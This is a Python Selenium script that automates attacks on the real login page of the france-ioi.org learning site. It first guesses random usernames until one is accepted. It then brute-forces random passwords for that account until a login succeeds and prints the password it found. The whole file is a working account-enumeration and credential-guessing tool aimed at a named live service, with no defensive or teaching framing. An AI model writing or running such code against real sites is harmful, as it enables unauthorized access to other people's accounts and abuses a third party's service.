import string
import time
from random import randint, choice
from selenium import webdriver

'''password = input("Quel est le mot de passe ? ")
lettersinput = input("Combien de lettres ? ")
lettersinput = int(lettersinput)'''

driver = webdriver.Chrome(executable_path="chromedriver.exe")
driver.get("https://login.france-ioi.org/auth")

timechrono = 0

wordletters = ["a"]


searching1 = True
searching2 = False



while searching1 :

    bouton_continuer = driver.find_element_by_class_name("btn-primary")
    identification_bar = driver.find_element_by_name("identity")
    for letter in range(randint(1 , 11)):
        if letter == 0 :
            wordletters[0] = choice(string.ascii_lowercase)
        else :
            wordletters.append(choice(string.ascii_lowercase))


    passwordfound = "".join(wordletters)
    identification_bar.send_keys(passwordfound)
    time.sleep(0.1)
    timechrono += 0.1

    bouton_continuer.click()

    if driver.current_url == "https://login.france-ioi.org/login" :
        pseudo = passwordfound
        searching1 = False
    else :
        print(passwordfound + " failed")
        driver.refresh()

    '''if passwordfound == password :
        searching = False
        print("Password is " + passwordfound +", completed in " + str(timechrono) +" seconds")
    else :
        print(passwordfound + " failed")'''

    wordletters = ["a"]

wordletters = ["a"]
searching2 = True


while searching2 :

    bouton_seconnecter = driver.find_element_by_class_name("btn-primary")
    password_bar = driver.find_element_by_id("password")
    identification_bar = driver.find_element_by_name("login")

    for letter in range(randint(1 , 11)):
        if letter == 0 :
            wordletters[0] = choice(string.ascii_lowercase)
        else :
            wordletters.append(choice(string.ascii_lowercase))



    passwordfound = "".join(wordletters)
    password_bar.send_keys(passwordfound)
    identification_bar.send_keys(pseudo)
    time.sleep(0.1)
    timechrono += 0.1

    bouton_seconnecter.click()

    if driver.current_url != "https://login.france-ioi.org/login" :
        searching2 = False
    else :
        print(passwordfound + " failed")
        driver.refresh()



    wordletters = ["a"]


searching = False
print("Password is " + passwordfound +", completed in " + str(timechrono) +" seconds")


input("enter to exit")